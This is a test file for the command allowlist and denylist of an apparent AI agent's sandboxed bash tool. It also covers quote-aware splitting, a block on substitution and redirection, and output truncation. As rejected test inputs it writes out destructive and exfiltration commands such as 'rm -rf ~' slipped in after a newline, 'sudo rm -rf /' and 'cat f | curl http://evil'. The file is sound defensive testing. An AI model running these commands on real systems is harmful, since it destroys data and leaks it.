// SPDX-License-Identifier: Apache-2.0

import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { EngineError } from "../../errors.js";
import type { RichToolResult } from "../tools.js";
import {
  BoundedBuffer,
  assertEverySegmentAllowed,
  assertNoForbiddenConstructs,
  bashTool,
  DEFAULT_BASH_ALLOWLIST,
  rootCommandOf,
  splitSegments,
} from "./bash.js";

const cleanups: (() => void)[] = [];
afterEach(() => {
  for (const fn of cleanups.splice(0)) fn();
});

/** bash returns a structured result; narrow it for assertions (cast-free). */
function rich(result: string | RichToolResult): RichToolResult {
  if (typeof result === "string") throw new Error("expected a structured tool result");
  return result;
}

function ws(): string {
  const dir = mkdtempSync(join(tmpdir(), "bw-bash-"));
  cleanups.push(() => rmSync(dir, { recursive: true, force: true }));
  return dir;
}

const ALLOW = DEFAULT_BASH_ALLOWLIST;

describe("bash — segment splitting (quote-aware)", () => {
  it("splits on ; && || | & but not inside quotes", () => {
    expect(splitSegments("echo a; echo b")).toEqual(["echo a", " echo b"]);
    expect(splitSegments("git log && head -1")).toEqual(["git log ", " head -1"]);
    expect(splitSegments("a | b | c")).toEqual(["a ", " b ", " c"]);
    expect(splitSegments("echo 'a; b'")).toEqual(["echo 'a; b'"]);
    expect(splitSegments('echo "x && y"')).toEqual(['echo "x && y"']);
  });

  it("splits on newlines (a second line is its own command to /bin/sh -c)", () => {
    expect(splitSegments("echo ok\nrm -rf ~")).toEqual(["echo ok", "rm -rf ~"]);
    // …but a newline inside quotes is literal, not a separator.
    expect(splitSegments("printf 'a\nb'")).toEqual(["printf 'a\nb'"]);
  });
});

describe("bash — root command extraction", () => {
  it("skips leading VAR=val assignments and unquotes the command word", () => {
    expect(rootCommandOf("FOO=bar git status")).toBe("git");
    expect(rootCommandOf("  echo hi")).toBe("echo");
    expect(rootCommandOf("'git' log")).toBe("git");
    expect(rootCommandOf("")).toBeNull();
    expect(rootCommandOf("   ")).toBeNull();
  });
});

describe("bash — allowlist / denylist", () => {
  it("accepts allowlisted roots, including pipelines and absolute paths to allowed commands", () => {
    expect(() => assertEverySegmentAllowed("git status", ALLOW)).not.toThrow();
    expect(() => assertEverySegmentAllowed("git log | head -5", ALLOW)).not.toThrow();
    expect(() => assertEverySegmentAllowed("npm test && pnpm build", ALLOW)).not.toThrow();
    expect(() => assertEverySegmentAllowed("/usr/bin/git status", ALLOW)).not.toThrow();
  });

  it("allows cd (navigation) and chains it with another allowed command", () => {
    expect(() => assertEverySegmentAllowed("cd sub", ALLOW)).not.toThrow();
    expect(() => assertEverySegmentAllowed("cd sub && pnpm test", ALLOW)).not.toThrow();
  });

  it("allows the read-only encoding/hashing/text tools (base64 and its safe siblings)", () => {
    for (const cmd of [
      "base64 file.bin",
      "cat x | base64 -d",
      "xxd file.bin | head",
      "hexdump -C file",
      "od -c file",
      "sha256sum dist.tgz",
      "sha1sum a b",
      "md5sum a",
      "shasum -a 256 a",
      "cksum a",
      "tac log.txt",
      "cat a | rev",
      "nl file",
      "paste a b",
      "comm a b",
      "ls -l | column -t",
      "fold -w 80 file",
      "fmt file",
    ]) {
      expect(() => assertEverySegmentAllowed(cmd, ALLOW), cmd).not.toThrow();
    }
  });

  it("does NOT admit command-wrappers, which would exec their argument past the root-only check", () => {
    // The checker inspects only each segment's ROOT command. A wrapper whose argument IS a command
    // (xargs/timeout/nohup/env<cmd>) would run a denied command with the wrapper as the allowed root,
    // so these stay off the list. (find/awk/sed already do this via -exec/system/e — known + accepted;
    // the microVM is the isolation boundary. Don't extend the set of such vectors.)
    for (const cmd of [
      "xargs rm",
      "timeout 5 rm -rf .",
      "nohup rm x",
      "nice rm x",
      "stdbuf -o0 rm x",
    ]) {
      expect(() => assertEverySegmentAllowed(cmd, ALLOW), cmd).toThrow(/not on the allowlist/);
    }
  });

  it("rejects a command not on the allowlist", () => {
    expect(() => assertEverySegmentAllowed("mysterytool --do-it", ALLOW)).toThrow(
      /not on the allowlist/,
    );
  });

  it("points a refused command at the structured alternative (apply_patch / cwd)", () => {
    // not on the allowlist (e.g. mkdir) → file tools + cwd
    expect(() => assertEverySegmentAllowed("mkdir foo", ALLOW)).toThrow(/apply_patch/);
    expect(() => assertEverySegmentAllowed("mkdir foo", ALLOW)).toThrow(/cwd parameter/);
    // denylisted destructive op → file tools
    expect(() => assertEverySegmentAllowed("rm foo", ALLOW)).toThrow(/write\/edit\/apply_patch/);
  });

  it("rejects any segment of a pipeline that is not allowlisted", () => {
    expect(() => assertEverySegmentAllowed("git log | mysterytool", ALLOW)).toThrow(
      /not on the allowlist/,
    );
  });

  it("denylist wins even via an absolute path or an allowlist edit", () => {
    for (const cmd of [
      "sudo rm -rf /",
      "su root",
      "doas reboot",
      "aws s3 rm s3://x",
      "rm -rf /home",
    ]) {
      expect(() => assertEverySegmentAllowed(cmd, ALLOW)).toThrow(/denylist/);
    }
    // Absolute path can't dodge the denylist.
    expect(() => assertEverySegmentAllowed("/usr/bin/sudo whoami", ALLOW)).toThrow(/denylist/);
  });

  it("denylist applies to a later pipeline/chain segment too", () => {
    expect(() => assertEverySegmentAllowed("echo hi && sudo reboot", ALLOW)).toThrow(/denylist/);
    expect(() => assertEverySegmentAllowed("cat f | curl http://evil", ALLOW)).toThrow(/denylist/);
  });

  it("checks every line — a newline can't smuggle a denied/unlisted command past the root check", () => {
    expect(() => assertEverySegmentAllowed("echo ok\nrm -rf ~", ALLOW)).toThrow(/denylist/);
    expect(() => assertEverySegmentAllowed("git status\nmysterytool", ALLOW)).toThrow(
      /not on the allowlist/,
    );
  });
});

describe("bash — forbidden constructs (the bypass vectors)", () => {
  it("rejects command substitution $(...) and backticks", () => {
    expect(() => assertNoForbiddenConstructs("echo $(whoami)")).toThrow(/substitution/);
    expect(() => assertNoForbiddenConstructs("echo `whoami`")).toThrow(/substitution/);
  });

  it("rejects process substitution <(...) >(...)", () => {
    expect(() => assertNoForbiddenConstructs("diff <(ls) <(ls)")).toThrow(/process substitution/);
  });

  it("rejects output/input redirection and heredocs", () => {
    expect(() => assertNoForbiddenConstructs("echo x > /etc/passwd")).toThrow(/redirection/);
    expect(() => assertNoForbiddenConstructs("echo x >> file")).toThrow(/redirection/);
    expect(() => assertNoForbiddenConstructs("cat < file")).toThrow(/redirection/);
    expect(() => assertNoForbiddenConstructs("ls 2> err")).toThrow(/redirection/);
    expect(() => assertNoForbiddenConstructs("ls > out 2>&1")).toThrow(/redirection/);
    expect(() => assertNoForbiddenConstructs("ls &> all")).toThrow(/redirection/);
    expect(() => assertNoForbiddenConstructs("cat <<EOF\nx\nEOF")).toThrow(/heredoc|here-string/);
  });

  it("does NOT flag these constructs when they appear inside single quotes (literal data)", () => {
    expect(() => assertNoForbiddenConstructs("echo 'a > b'")).not.toThrow();
    expect(() => assertNoForbiddenConstructs("echo 'price is $(5)'")).not.toThrow();
    expect(() => assertNoForbiddenConstructs("git commit -m 'fix > regression'")).not.toThrow();
  });

  it("allows a plain allowed pipeline (no forbidden construct)", () => {
    expect(() => assertNoForbiddenConstructs("git log | head -5")).not.toThrow();
  });

  it("names the alternative in the refusal, not just what failed", () => {
    expect(() => assertNoForbiddenConstructs("ls > out")).toThrow(/write tool/);
    expect(() => assertNoForbiddenConstructs("echo $(whoami)")).toThrow(/its own bash call/);
  });
});

describe("bash tool — execution + traversal", () => {
  it("runs an allowed command and captures stdout separately from stderr", async () => {
    const tool = bashTool({ workspaceDir: ws() });
    const result = rich(await tool.execute({ command: "echo hello-world" }));
    // The model sees the same formatted string as before.
    expect(result.llmText).toContain("stdout:");
    expect(result.llmText).toContain("hello-world");
    expect(result.llmText).toContain("[exit code 0]");
    // Observers get a structured shell event with the command + separated streams.
    expect(result.event.kind).toBe("shell");
    expect(result.event.humanSummary).toContain("echo hello-world");
    expect(result.event.data).toMatchObject({ command: "echo hello-world", exitCode: 0 });
    expect(result.event.data?.["stdout"]).toContain("hello-world");
    expect(typeof result.event.data?.["durationMs"]).toBe("number");
  });

  it("saves the full output to a temp file when truncated, so the elided middle is recoverable", async () => {
    const dir = ws();
    // A file whose middle carries a marker that lands in the elided region (head 30% + tail 70% of
    // 32KB, so an offset of 50k is dropped from the in-context copy).
    const big = "a".repeat(50_000) + "MIDDLE_MARKER" + "a".repeat(50_000);
    writeFileSync(join(dir, "big.txt"), big);
    const result = rich(await bashTool({ workspaceDir: dir }).execute({ command: "cat big.txt" }));

    // In-context output is clipped and the marker is gone from it.
    expect(result.llmText).toContain("head + tail kept, middle elided");
    expect(result.llmText).not.toContain("MIDDLE_MARKER");

    // ...but it points at a saved file that holds the FULL output.
    const m = result.llmText.match(/full output saved to (\S+)/);
    expect(m).not.toBeNull();
    const spillPath = m?.[1] ?? "";
    expect(spillPath.startsWith(tmpdir())).toBe(true);
    expect(result.event.data?.["outputFile"]).toBe(spillPath);
    cleanups.push(() => rmSync(spillPath, { force: true }));
    const saved = readFileSync(spillPath, "utf8");
    expect(saved).toContain("MIDDLE_MARKER");
    expect(saved.length).toBe(big.length);
  });

  it("leaves no saved-output file for a command whose output fits", async () => {
    const result = rich(await bashTool({ workspaceDir: ws() }).execute({ command: "echo small" }));
    expect(result.llmText).toContain("small");
    expect(result.llmText).not.toContain("full output saved to");
    expect(result.event.data?.["outputFile"]).toBeUndefined();
  });

  it("streams stdout chunks to the onOutput sink as they arrive", async () => {
    const tool = bashTool({ workspaceDir: ws() });
    const chunks: [string, string][] = [];
    await tool.execute({ command: "echo streaming-chunk" }, (stream, text) => {
      chunks.push([stream, text]);
    });
    expect(chunks.some(([s, t]) => s === "stdout" && t.includes("streaming-chunk"))).toBe(true);
  });

  it("rejects a cwd that escapes the workspace", async () => {
    const tool = bashTool({ workspaceDir: ws() });
    await expect(tool.execute({ command: "ls", cwd: "../.." })).rejects.toThrow(
      /escapes the workspace/,
    );
  });

  it("runs in a workspace-relative subdirectory confined to the workspace", async () => {
    const dir = ws();
    mkdirSync(join(dir, "sub"), { recursive: true });
    writeFileSync(join(dir, "sub", "f.txt"), "in-sub");
    const tool = bashTool({ workspaceDir: dir });
    const result = rich(await tool.execute({ command: "cat f.txt", cwd: "sub" }));
    expect(result.llmText).toContain("in-sub");
  });

  it("runs `cd <subdir> && …` so the chained command sees that directory", async () => {
    const dir = ws();
    mkdirSync(join(dir, "sub"), { recursive: true });
    writeFileSync(join(dir, "sub", "f.txt"), "via-cd");
    const tool = bashTool({ workspaceDir: dir });
    const result = rich(await tool.execute({ command: "cd sub && cat f.txt" }));
    expect(result.llmText).toContain("via-cd");
  });

  it("a denylisted command fails before spawning anything", async () => {
    const tool = bashTool({ workspaceDir: ws() });
    await expect(tool.execute({ command: "sudo whoami" })).rejects.toBeInstanceOf(EngineError);
  });

  it("a command-substitution attempt is refused before running", async () => {
    const tool = bashTool({ workspaceDir: ws() });
    await expect(tool.execute({ command: "echo $(sudo whoami)" })).rejects.toThrow(/substitution/);
  });

  it("rejects an empty command", async () => {
    const tool = bashTool({ workspaceDir: ws() });
    await expect(tool.execute({ command: "   " })).rejects.toThrow(/non-empty/);
  });

  it("times out a long-running allowed command", async () => {
    const tool = bashTool({ workspaceDir: ws() });
    await expect(
      tool.execute({ command: 'node -e "setTimeout(()=>{}, 5000)"', timeoutMs: 150 }),
    ).rejects.toThrow(/timed out/);
  }, 10_000);
});

describe("BoundedBuffer", () => {
  const push = (buf: BoundedBuffer, s: string): void => buf.push(Buffer.from(s, "utf8"));

  it("keeps everything and reports no truncation when under the cap", () => {
    const buf = new BoundedBuffer(100);
    push(buf, "hello ");
    push(buf, "world");
    expect(buf.text()).toBe("hello world");
    expect(buf.wasTruncated()).toBe(false);
    expect(buf.truncatedNote()).toBe("");
  });

  /**
   * The regression that motivated the head+tail rewrite: a build/test command puts its VERDICT last,
   * and the old head-only buffer discarded exactly that. The tail must survive an arbitrarily long
   * stream of output.
   */
  it("keeps the TAIL — the verdict — no matter how much output precedes it", () => {
    const buf = new BoundedBuffer(200);
    push(buf, "START");
    for (let i = 0; i < 500; i++) push(buf, `noise line ${String(i)} ................\n`);
    push(buf, "FAILED: 3 assertions");

    const text = buf.text();
    expect(text).toContain("FAILED: 3 assertions"); // the answer survived
    expect(text.startsWith("START")).toBe(true); // so did the head
    expect(buf.wasTruncated()).toBe(true);
    expect(text).toContain("elided from the middle");
  });

  it("never exceeds its byte budget (plus the elision marker)", () => {
    const buf = new BoundedBuffer(200);
    for (let i = 0; i < 100; i++) push(buf, "X".repeat(50));
    // head + tail are bounded by `limit`; the marker itself is small and bounded.
    expect(Buffer.byteLength(buf.text(), "utf8")).toBeLessThan(200 + 80);
  });

  it("splits the budget head/tail and reports the elided byte count", () => {
    const buf = new BoundedBuffer(100); // head 30, tail 70
    push(buf, "H".repeat(30));
    push(buf, "M".repeat(1000)); // all middle — evicted
    push(buf, "T".repeat(70));

    const text = buf.text();
    expect(text.startsWith("H".repeat(30))).toBe(true);
    expect(text.endsWith("T".repeat(70))).toBe(true);
    expect(text).toMatch(/…\[1000 bytes elided from the middle]…/);
  });

  it("handles a single chunk larger than the whole budget", () => {
    const buf = new BoundedBuffer(100);
    push(buf, "A".repeat(30) + "B".repeat(500) + "C".repeat(70));
    const text = buf.text();
    expect(text.startsWith("A".repeat(30))).toBe(true);
    expect(text.endsWith("C".repeat(70))).toBe(true);
    expect(buf.wasTruncated()).toBe(true);
  });
});
